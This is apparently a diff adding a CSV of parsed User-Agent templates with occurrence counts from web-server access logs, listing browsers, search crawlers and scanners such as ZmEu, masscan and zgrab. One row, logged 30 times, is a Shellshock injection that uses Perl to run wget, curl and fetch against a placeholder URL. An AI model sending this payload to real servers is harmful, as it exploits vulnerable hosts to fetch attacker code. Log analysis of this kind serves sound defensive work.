@@ -1,0 +1,272 @@
+EventId,EventTemplate,Occurrences
+8004b04d,Mozilla/<*>.<*> <*> <*> <*> <*> rv:<*>.<*>) Gecko/<*> Firefox/<*>.<*>,12452
+ee44e5e2,WordPress/<*>.<*>.<*>; <*>,1047
+336d5ebc,-,958
+23497c84,Mozilla/<*>.<*> (compatible; <*> <*>,12559
+7f7850f9,Mozilla/<*>.<*> (Windows NT <*>.<*>; WOW64) <*> <*> like Gecko) <*> Safari/<*>.<*>,915
+dad68822,"Mozilla/<*>.<*> <*> <*> <*> <*> (KHTML, like Gecko) <*> Safari/<*>.<*>",1450
+a7f372dd,"Mozilla/<*>.<*> (Windows NT <*>.<*>; <*> x64) <*> (KHTML, like Gecko) <*> Safari/<*>.<*>",11995
+0a692a0c,Mozilla/<*>.<*> <*> U; Windows NT <*>.<*>; <*> <*> Gecko/<*> <*>,547
+40e3dfff,Mozilla/<*>.<*> (Windows NT <*>.<*>; <*> <*> <*> <*>,57
+a5a58065,ZmEu,186
+5d81860b,Mozilla/<*>.<*> (X11; Linux <*> <*> Gecko/<*> <*>,41
+49ea2550,Mozilla/<*>.<*> <*> MSIE <*> Windows NT <*> <*>,909
+1040de9d,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; AOL <*>.<*>; Windows NT <*>.<*>),9
+8de78789,okhttp/<*>.<*>.<*>,3
+1619f2ce,"Mozilla/<*>.<*> (compatible; DotBot/<*>.<*>; http://www.opensiteexplorer.org/dotbot, help@moz.com)",116
+2b03a4c6,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> <*> <*> <*> <*> <*> .NET CLR <*>.<*>.<*>),7
+416494cd,"Mozilla/<*>.<*> <*> <*> <*> <*> AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> <*> <*>",117
+49a666a8,Mozilla/<*>.<*> (Macintosh; Intel Mac OS X <*> <*> <*> like Gecko) <*> <*>,6010
+98c10d02,"Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; en-us; Nexus <*> Build/JOP40D) AppleWebKit/<*>.<*> (KHTML, like Gecko; googleweblight) Chrome<*> Mobile Safari/<*>.<*>",171
+336249ab,masscan/<*>.<*> (https://github.com/robertdavidgraham/masscan),37
+6b3a3222,Mozilla/<*>.<*> (Windows NT <*> <*> x64; <*> Gecko/<*> <*>,549
+ebc120b7,WordPress/<*>.<*>; http://cityspin.net,57
+aa1d5393,Mozilla/<*>.<*> (Macintosh; Intel Mac OS <*> <*> <*> <*> <*>,35
+c6715a18,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; SLCC2; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>),147
+76c62731,"Mozilla/<*>.<*> (Macintosh; U; <*> Mac OS X <*>_<*>_<*>) AppleWebKit/<*>.<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*> Edge/<*>.<*>",81
+fa72d011,"Mozilla/<*>.<*> (Windows NT <*>.<*>; <*> x64) <*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*> <*>",88
+e020d5cd,Mozilla/<*>.<*> (Windows NT <*>.<*>; <*> <*> <*>,224
+3c178985,Mozilla/<*>.<*> (Windows; U; Windows NT <*>.<*>;en-US; rv:<*>.<*>.<*>) Gecko/<*> Firefox/<*>.<*>),58
+bd7443a8,"Mozilla/<*>.<*> (Macintosh; Intel Mac OS X <*>_<*>_<*>) <*> (KHTML, like Gecko) Chrome<*> <*> <*>",53
+f3847f0d,Mozilla/<*>.<*> (Windows NT <*>.<*>; rv:<*>.<*>) Gecko Firefox/<*>.<*> (via ggpht.com GoogleImageProxy),3
+53a8a56a,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows <*> <*> <*> <*>,113
+4c55ba51,Mozilla/<*>.<*> (compatible; Linux x86_<*>; Mail.RU_Bot/<*>.<*>; +http://go.mail.ru/help/robots),34
+a55a1c14,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> <*>,36
+a9e2fc05,Sogou web spider/<*>.<*>(+http://www.sogou.com/docs/help/webmasters.htm#<*>),15
+580df61c,HTTP Banner Detection (https://security.ipip.net),4
+9db91164,Mozilla/<*>.<*> (compatible; MSIE <*>.0b; Windows NT <*>.<*> ; .NET CLR <*>.<*>.<*>; SL Commerce Client v1.<*>; Tablet PC <*>.<*>,3
+d2495a7e,Googlebot/<*>.<*> (+http://www.google.com/bot.html),41
+81546f84,"Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; Nexus 5X Build/MMB29P) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Mobile Safari/<*>.<*> (compatible; Googlebot/<*>.<*>; +http://www.google.com/bot.html)",581
+588ef033,Mozilla/<*>.<*> Beta (Windows),9
+86c9edc9,"Mozilla/<*>.<*> () AppleWebKit/<*>.<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*> Edge/<*>.<*>",2
+a8ba5604,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; <*> <*> <*>,2
+71c59530,Opera/<*>.<*> (Windows NT <*> <*> <*>,19
+a4d28e2e,Mozilla/<*>.<*> (compatible; MSIE <*> Windows <*>,39
+cc2d630f,NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com,2
+4fd1f5c1,GigablastOpenSource/<*>.<*>,4
+64d69c62,"Mozilla/<*>.<*> <*> <*> <*> <*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*> OPR<*>",25
+fd6d41bb,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> <*> <*> <*> <*>,16
+e2f34582,"Mozilla/<*>.<*> (Macintosh; Intel Mac OS X <*>_<*>_<*>) AppleWebKit/<*>.<*>.<*> (KHTML, like Gecko) Version/<*>.<*>.<*> Safari/<*>.<*>.<*> (Applebot/<*>.<*>; +http://www.apple.com/go/applebot)",13
+63e4e417,msnbot/<*>.0b (+http://search.msn.com/msnbot.htm),49
+fd65da26,Barkrowler/<*>.<*> (+https://babbar.tech/crawler),70
+94f798b4,LightspeedSystemsCrawler Mozilla/<*>.<*> (Windows; U; MSIE <*>.<*>; Windows NT <*>.<*>; en-US),24
+60fd11fb,Mozilla/<*>.<*> (Windows; U; Windows NT <*>.<*>; rv:<*>.<*>) Gecko/<*>,1
+0ec1548c,success agent,61
+ed8eb1d5,curl/<*>.<*>.<*>,41
+fdf1c1b2,Mozilla/<*>.<*> (compatible- MSIE <*>.<*>- Windows NT <*>.<*>- SV1- .NET CLR <*>.<*>.<*>,6
+fcbe6ad4,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows <*> <*> <*> <*> <*>,44
+383adf81,"Mozilla/<*>.<*> (X11; Linux x86_<*>) AppleWebKit/<*>.<*> (KHTML, like Gecko) <*> <*> <*> <*>",158
+96d589b1,Go-http-client/<*>.<*>,36
+ccc4eb9d,Blackboard Safeassign,6
+7f048982,Mozilla/<*>.<*> (compatible; Seekport Crawler; http://seekport.com/),52
+cff16431,Mozilla/<*>.<*> (compatible; <*> <*> Windows NT <*>.<*>; WOW64; <*> <*> <*> <*>,10
+986c3748,Chrome,2
+e6815d3a,Googlebot-Image/<*>.<*>,22
+fd0aa17c,Mozilla/<*>.<*> (X11; U; Linux i686)Gecko/<*> Firefox<*>,4
+1ca3ac8c,python-requests/<*>.<*>.<*>,27
+366170e0,Mozilla/<*>.<*> (Windows NT <*>.<*>; Win64; x64; Trident/<*>.<*>; rv:<*>.<*>) like Gecko,15
+efb3b061,"Mozilla/<*>.<*> AppleWebKit/<*>.<*> (KHTML, like Gecko; compatible; Googlebot/<*>.<*>; +http://www.google.com/bot.html) Chrome<*> Safari/<*>.<*>",19
+30126c9d,facebookexternalhit/<*>.<*> (+http://www.facebook.com/externalhit_uatext.php),8
+b7e8c996,Mozilla/<*>.<*> (Windows NT <*>.<*>; WOW64; Trident/<*>.<*>; rv:<*>.<*>) like Gecko,114
+ccc3ab74,"Mozilla/<*>.<*> (Windows NT <*>.<*>; WOW64) AppleWebKit/<*>+ (KHTML, like Gecko) BingPreview/<*>.0b",34
+3a27c588,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows <*> <*>,118
+5c123514,Mozilla/<*>.<*>,4
+1f697f37,CheckMarkNetwork/<*>.<*> (+http://www.checkmarknetwork.com/spider.html),23
+64b8a3b8,"Mozilla/<*>.<*> (Windows NT <*>.<*>; <*> <*> (KHTML, like Gecko) <*> <*> <*>",122
+ff0ca925,ltx71 - (http://ltx71.com/),19
+11ba488d,Dispatch/<*>.<*>.<*>,21
+15534caa,Mozilla/<*>.<*> (compatible; <*>,35
+5717b0e6,"Mozilla/<*>.<*> (Linux; Android <*> <*> <*> AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Mobile Safari/<*>.<*>",25
+d7f751ac,Opera/<*>.<*> (Windows NT <*>.<*>),6
+b0f933f3,Mozilla/<*>.<*> (x86 [en] Windows NT <*>.<*>; Sun),3
+54e795ef,check_http/v2.<*>.<*> (nagios-plugins <*>.<*>.<*>),10754
+d0a7095a,curl/<*>.<*>.<*> (mips-unknown-linux-gnu) libcurl/<*>.<*>.<*> OpenSSL/<*>.<*>.8i zlib/<*>.<*>.<*>,199
+33e398db,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> <*> .NET CLR <*> .NET CLR <*>.<*>.<*>),15
+bbf95156,"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http:/<*>/YOUR_URL_HERE ; curl -O http:/<*>/YOUR_URL_HERE ; fetch http:/<*>/YOUR_URL_HERE\"");'",30
+73be0af7,"Mozilla/<*>.<*> (Windows NT <*>.<*>; WOW64) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*> SE <*>.X MetaSr <*>.<*>",2
+f09fa319,Wget(linux),174
+02875f64,Mozilla/<*>.<*> (X11; <*> Linux i686; <*> <*> <*>,4
+f028e62a,"Mozilla/<*>.<*> (Linux; Android <*>.<*>; Lenovo A1000 Build/S100) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Mobile Safari/<*>.<*> OPR<*>",2
+be6fedc6,"Mozilla/<*>.<*> AppleWebKit/<*>.<*> (KHTML, like Gecko; Google Web Preview Analytics) Chrome/<*>.<*>.<*> Safari/<*>.<*> (compatible; Googlebot/<*>.<*>; +http://www.google.com/bot.html)",27
+127c3679,Dalvik/<*>.<*>.<*> (Linux; U; Android <*>.<*>.<*>; R2001 Build/JDQ39),4
+60d8d549,Cloud mapping experiment. Contact research@pdrlabs.net,5
+d3d9c0d8,Mozilla/<*>.<*> (Windows; U; Windows NT <*>.<*>; en; rv:<*>) Gecko/<*> Firefox/<*>.<*>.<*> (.NET CLR <*>.<*>.<*>) SurveyBot/<*>.<*> (DomainTools),45
+c0e84420,Mozilla/<*>.<*> <*> <*> Windows NT <*> <*> rv:<*>) Gecko/<*> <*> <*> <*> CLR <*>.<*>.<*>),8
+e29ee850,"Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; <*> <*> <*> AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Chrome<*> Mobile Safari/<*>.<*> GSA<*>.arm",9
+21ad0bd8,bb,1
+107e1268,"Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; SM-T116NU Build/KTU84P) AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Chrome<*> Safari/<*>.<*> GSA<*>.arm",1
+61bb6b83,Telesphoreo,19
+836ce196,Twitterbot/<*>.<*>,30
+49c118c9,Mozilla/<*>.<*> (Windows U Windows NT <*>.<*> ru rv:<*>) Gecko/<*> MRA <*>.<*> (build <*>) Firefox/<*>.<*>.<*> (.NET CLR <*>.<*>.<*>) sputnik <*>,1
+0bb5d344,Mozilla/<*>.<*> (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp),40
+bfa1c485,the beast,7
+38c8303a,Mozilla/<*>.<*> (Android <*>.<*>; Mobile; rv:<*>.<*>) Gecko/<*>.<*> Firefox/<*>.<*>,26
+d558024d,Mozilla/<*>.<*> zgrab/<*>.x,65
+99f34a21,roboto,10
+a768ba72,"<a href=\""http://forum.windowsfaq.ru/\"">Forum.WindowsFAQ.ru</a>",7
+793914c9,md,1
+7cdcfa8e,"Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; <*> <*> AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Chrome<*> Mobile Safari/<*>.<*> GSA<*>.arm",2
+238841ee,"(User-Agent,Mozilla/<*>.<*> (X11; Linux x86_<*>) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*>)",1
+a1387d71,"Mozilla/<*>.<*> (iPhone; CPU iPhone OS <*> like Mac OS X) <*> (KHTML, like Gecko) <*> <*> <*>",7
+437fec70,Mozilla/<*>.<*> (compatible; MSIE or Firefox mutant;) Daum <*>.<*>,3
+c326339f,Mozilla/<*>.<*> (compatible; Netcraft Web Server Survey),6
+ff559369,Mozilla/<*>.<*> Project <*> (project25499.com),2
+b7abaf19,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows Phone <*>.<*>; Trident/<*>.<*>; IEMobile/<*>.<*>; ARM; Touch; NOKIA; Lumia <*>),1
+3817848e,tp,1
+eaf609c5,"Mozilla/<*>.<*> (Linux; U; Android <*>.<*>.<*>; en-us; A1-<*> Build/JDQ39) AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Safari/<*>.<*>",2
+aa591993,"Mozilla/<*>.<*> <*> <*> Windows NT <*> en-US) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*>",10
+1fadc803,Opera/<*>.<*> (J2ME/MIDP Opera Mini/<*>.<*>.<*>/<*>.<*> U ru) Presto/<*>.<*>.<*> Version/<*>.<*>,2
+29dcc613,"Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; <*> <*> <*> AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Mobile Safari/<*>.<*>",60
+f6a757d3,Dalvik/<*>.<*>.<*> (Linux; U; Android <*>.<*>.<*>; Mi 4i MIUI/V<*>.LXIMIDE),1
+65d53bf3,facebookexternalhit/<*>.<*>;line-poker/<*>.<*>,20
+757094ee,Mozilla/<*>.<*> (Windows U Windows NT <*>.<*> ru rv:<*>) Gecko/<*> Firefox/<*>.<*>.<*> ( .NET CLR <*>.<*>.<*>) YB/<*>.<*>.<*>,1
+f3a47e8c,Opera/<*>.<*> (Windows NT <*>.<*> U MRA <*>.<*> (build <*>) ru),1
+2ba2e0ef,www.probethenet.com scanner,8
+e24cbb48,Whibse,1
+f5d39336,"Mozilla/<*>.<*> (X11; Ubuntu; Linux i686) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*>",1
+5fa1f1e8,Mozilla/<*>.<*> (compatible MSIE <*>.<*> Windows NT <*>.<*> Trident/<*>.<*> MRA <*>.<*> (build <*>) SLCC2 .NET CLR <*>.<*>.<*> .NET CLR <*>.<*>.<*> .NET CLR <*>.<*>.<*> Media Center PC <*>.<*> .NET4.0C BRI/<*>),1
+25d5864e,Mozilla/<*>.<*> (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html),4
+6a8b18ba,CCBot/<*>.<*> <*>,14
+d2930312,"Mozilla/<*>.<*> (Linux; U; Android <*> en-US; Lenovo <*> <*> AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> UCBrowser<*> U3/<*>.<*>.<*> Mobile Safari/<*>.<*>",26
+84f7ea0b,Mozilla/<*>.<*> (compatible MSIE <*>.<*> Windows NT <*>.<*> Trident/<*>.<*> SLCC2 .NET CLR <*>.<*>.<*> .NET CLR <*>.<*>.<*> .NET CLR <*>.<*>.<*> MALN InfoPath.<*> .NET4.0C),1
+2ca746bf,Mechanize/<*>.<*>.<*> Ruby/<*>.<*>.3p551 (http://github.com/sparklemotion/mechanize/),29
+5c29dcad,Opera/<*>.<*> (Windows NT <*>.<*> U MRA <*>.<*> (build <*>) ru) Presto/<*>.<*>.<*> Version/<*>.<*>,1
+94b58b32,Mozilla/<*>.<*> (Windows U Windows NT <*>.<*> ru rv:<*>) Gecko/<*> MRA <*>.<*> (build <*>) Firefox/<*>.<*>.<*> sputnik <*>,1
+83c76619,Mozilla/<*>.<*> (Windows; U; MSIE <*>.<*>; Windows NT <*>.<*>; <*>,12
+e3859c90,"\""Mozilla/<*>.<*>",2
+ffcf7fd0,"Mozilla/<*>.<*>(Linux;U;Android <*>.<*>.<*>;zh-CN;OPPO A33 Build/LMY47V) AppleWebKit/<*>.<*>(KHTML,like Gecko) Version/<*>.<*> Chrome<*> UCBrowser<*> Mobile Safari/<*>.<*>",42
+d22d9bb7,"Mozilla/<*>.<*>(Linux;Android <*>.<*>.<*>;OPPO A33 Build/LMY47V;wv) AppleWebKit/<*>.<*>(KHTML,link Gecko) Version/<*>.<*> Chrome<*> Mobile Safari/<*>.<*> <*>",55
+308d2aef,"Hello, <*>",9
+ea8d5bc3,Opera/<*>.<*> (Windows NT <*>.<*>; <*> Presto/<*>.<*>.<*> Version/<*>.<*>,920
+5e3e9d5f,"Mozilla/<*>.<*> (iPad; CPU OS <*>_<*>_<*> like Mac OS X) AppleWebKit/<*>.<*>.<*> (KHTML, like Gecko) Version/<*>.<*> <*> Safari/<*>.<*>",5
+a677326f,Mozilla/<*>.<*> (X11; U; Linux i686; pl-PL; rv:<*>) Gecko/<*> SUSE/<*>.<*>.<*>-<*>.<*> Firefox/<*>.<*>.<*>,236
+75780dd5,Mozilla/<*>.<*> (Macintosh; U; Intel Mac OS X <*>.<*>; fr; rv:<*>) Gecko/<*> Firefox/<*>.<*>.<*>,2
+54ff5829,"Mozilla/<*>.<*> (Linux; Android <*>.<*>; FRD-AL00 Build/HUAWEIFRD-AL00; wv) AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Chrome<*> Mobile MQQBrowser/<*>.<*> TBS/<*> Safari/<*>.<*> MicroMessenger<*> NetType/WIFI Language/zh_CN",42
+7f269c56,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Digital AlphaServer 1000A <*>/<*>; Windows NT; Powered By <*>-Bit Alpha Processor),9
+8f75d5e1,Mozilla/<*>.<*> (Macintosh; Intel Mac OS <*> <*>,5
+bc126963,Opera/<*>.<*> (Windows NT <*>.<*>; MRA <*>.<*> (build <*>)) Presto/<*>.<*>.<*> Version/<*>.<*>,41
+22d90d13,"Mozilla/<*>.<*> (Windows NT <*>.<*>) <*> (KHTML, like Gecko) <*> <*> <*>",13
+b0429251,Opera/<*>.<*> (Windows NT <*>.<*>; WOW64; MRA <*>.<*> (build <*>)) Presto/<*>.<*>.<*> Version/<*>.<*>,15
+00f44b72,Opera/<*>.<*> (Windows NT <*>.<*>; Win64; x64; MRA <*>.<*> (build <*>)) Presto/<*>.<*>.<*> Version/<*>.<*>,2
+2bee8f9d,Mozilla/<*>.<*> (Windows U Windows NT <*>.<*> ru rv:<*>) Gecko/<*> Firefox/<*>.<*>.<*> sputnik <*>,1
+9459ae61,"rogerbot/<*>.<*> (http://moz.com/help/pro/what-is-rogerbot-, rogerbot-wherecat@moz.com)",7
+09917693,"Mozilla/<*>.<*> <*> <*> <*> <*> <*> AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*>",12
+6f4d8031,Java/<*>.<*>.<*>_<*>,2
+ccc0734f,request.js,1
+e5ab4b1f,DF Bot <*>.<*>,10
+f5c5e4ee,Mnogosearch-<*>.<*>.<*>,4
+c6cd3a60,Mozilla/<*>.<*> <*> Intel Mac OS X <*> <*> Gecko/<*> <*>,160
+fdff3c35,"fasthttp, Mozilla/<*>.<*> (Windows NT <*>.<*>; WOW64) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*>",1
+5d612ed7,Mozilla/<*>.<*> <*> <*> <*> rv:<*>.<*>) Gecko/<*> Firefox/<*>.<*>,51
+cd50a6dd,Qwantify/<*>.<*>,4
+498d71e4,"['Mozilla/<*>.<*> (Windows NT <*>.<*>; WOW64) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*> GD']",1
+c689a50c,"['Mozilla/<*>.<*> (Macintosh; Intel Mac OS X <*>_<*>_<*>) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*> GD']",1
+901bbd32,Mozilla/<*>.<*> (compatible MSIE <*>.<*> Windows NT <*>.<*> WOW64 Trident/<*>.<*> SLCC2 .NET CLR <*>.<*>.<*> .NET CLR <*>.<*>.<*> .NET CLR <*>.<*>.<*> MAAU .NET4.0C AskTbPTV2<*>),1
+f5c0174c,Java/<*>.<*>.<*>_<*> java-oembed/<*>.<*>.<*>,3
+12d845d9,Opera/<*>.<*>,1
+8e042760,"Mozilla/<*>.<*> (Macintosh; U; Intel Mac OS X <*>_<*>_<*>; <*> AppleWebKit/<*>.<*>.<*> (KHTML, like Gecko) Version/<*>.<*>.<*> Safari/<*>.<*>.<*>",4
+5eec8fb2,['Mozilla/<*>.<*> (Macintosh; Intel Mac OS X <*>.<*>; rv:<*>.<*>) Gecko/<*> Firefox/<*>.<*> GD'],1
+e8b854c7,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; <*> <*> <*> <*> <*> <*> <*> <*>,4
+f6ba3e86,"Mozilla/<*>.<*> (X11; Linux x86_<*>) AppleWebKit/<*>.<*> (KHTML, like Gecko; Google Web Preview) Chrome/<*>.<*>.<*> Safari/<*>.<*>",24
+9ffbd83c,Digincore crawler bot. See https://www.digincore.com/crawler.html for rules and instructions.,1
+7ea096f2,scrapy-redis (+https://github.com/rolando/scrapy-redis),2
+b1b365d1,Mozilla/<*>.<*> (compatible; DomainAppender /<*>.<*>; +http://www.profound.net/domainappender),4
+93a1da74,"Mozilla/<*>.<*> (iPhone; CPU iPhone OS <*>_<*> like Mac OS X) AppleWebKit/<*>.<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Mobile/11A465 Safari/<*>.<*> (compatible; bingbot/<*>.<*>; +http://www.bing.com/bingbot.htm)",21
+847809e7,"Mozilla/<*>.<*> (iPhone; CPU iPhone OS <*>_<*> like Mac OS X) AppleWebKit/<*>.<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Mobile/11A465 Safari/<*>.<*> BingPreview/<*>.0b",32
+9ababf5f,"Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; SAMSUNG SM-G920T Build/MMB29K) AppleWebKit/<*>.<*> (KHTML, like Gecko) SamsungBrowser/<*>.<*> Chrome<*> Mobile Safari/<*>.<*>",9
+3bc21ec0,KickFire,1
+6d4f3a93,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; <*> <*> <*> <*> <*> <*> <*> <*> <*> <*>,3
+56123846,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> .NET CLR <*>.<*>.<*>; .NET CLR <*> <*> <*> <*> <*> <*> <*> <*> <*>,3
+272c418f,libwww-perl/<*>.<*>,4
+d41d8cd9,,2
+1f55e44b,Mozilla/<*>.<*> (Windows; Windows NT <*>.<*>; en-US) Firefox/<*>.<*>.<*>,8
+23e74eeb,"Mozilla/<*>.<*> (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/<*>.<*> (KHTML, like Gecko) Safari/<*>.<*>",3
+0f05fb7a,Opera/<*>.<*> (Windows NT <*>.<*>; <*> <*> <*> <*>,13
+e60ff2e5,Mozilla/<*>.<*> (X11; Ubuntu; Linux <*> rv:<*>.<*>) Gecko/<*> <*>,5957
+9eb2f9e7,Mozilla/<*>.<*> (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler),2
+c72493a0,Mozilla/<*>.<*> (compatible MSIE <*>.<*> Windows NT <*>.<*> SV1 K-xxxs RadioClicker http://radioclicker.com .NET CLR <*>.<*>.<*> RADIOCLICKER LITE .NET CLR <*> .NET CLR <*>.<*>.<*>),1
+8bc5cfa2,curl/<*>.<*>.<*> <*> libcurl/<*>.<*>.<*> <*> zlib/<*>.<*>.<*> libidn/<*>.<*> libssh2/<*>.<*>.<*>,2
+f329de14,"CRAZYWEBCRAWLER <*>.<*>.<*>, http://www.crazywebcrawler.com",1
+e7b7ef5d,WebGeno.me Research Project,1
+090ee23a,censys.io internet census,2
+3f1b2898,Mozilla/<*>.<*> (compatible MSIE <*>.<*> Windows NT <*>.<*> Trident/<*>.<*> WebMoney Advisor .NET CLR <*>.<*>.<*> .NET CLR <*>.<*>.<*> .NET CLR <*> .NET CLR <*>.<*>.<*> InfoPath.<*>),1
+81452748,Ryderspider/<*>.<*> (Googlebot/<*>.<*>),1
+cbdec2a5,User-Agent: Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>),20
+0a5b82a1,Apache-HttpClient/<*>.<*>.<*> (Java/<*>.<*>.<*>_<*>),1280
+289f9c92,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> <*> .NET CLR <*>.<*>.<*>; <*> <*> <*> <*> <*> <*> <*> .NET CLR <*>.<*>.<*>),2
+e8939b08,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> <*> <*> <*> <*> <*> <*> <*>,2
+1d201f2a,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; WOW64; Trident/<*>.<*>; SLCC2; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; <*> <*> <*> <*> <*> <*> <*> <*>,2
+ff597258,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> SLCC2; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; InfoPath.<*>; <*> <*> <*>,3
+d9896e55,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> <*> <*> <*> <*> <*> <*> <*> <*> <*> <*>; .NET CLR <*>.<*>.<*>; .NET CLR <*> .NET CLR <*>.<*>.<*>),3
+e7d6effa,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> <*> .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; <*> <*> <*> <*>,2
+2b6a9c45,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; Tablet PC <*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>; InfoPath.<*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>),1
+744d263c,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> <*> <*> <*> <*> <*> <*> <*> <*> <*> <*> <*> <*> .NET CLR <*>.<*>.<*>; .NET CLR <*> .NET CLR <*>,4
+1b0d191c,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> <*> <*> <*> <*> <*> <*> <*> .NET CLR <*>.<*>.<*>; .NET CLR <*> <*> <*> <*>,3
+dea3efd6,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; SLCC2; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; .NET CLR <*>.<*>.<*>; InfoPath.<*>),1
+92a27db5,"Mozilla/<*>.<*> (Windows NT <*>.<*>) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*> Mozilla/<*>.<*> (iPad; U; CPU OS <*>_<*> like Mac OS X; en-us) AppleWebKit/<*>.<*>.<*> (KHTML, like Gecko) Version/<*>.<*>.<*> Mobile/7B334b Safari/<*>.<*>.<*>",1
+21e193b8,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; SLCC1; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; <*>,2
+b4ee8a75,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; GTB6; SLCC1; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; Windows-Media-Player<*>; Zune <*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; yie8),2
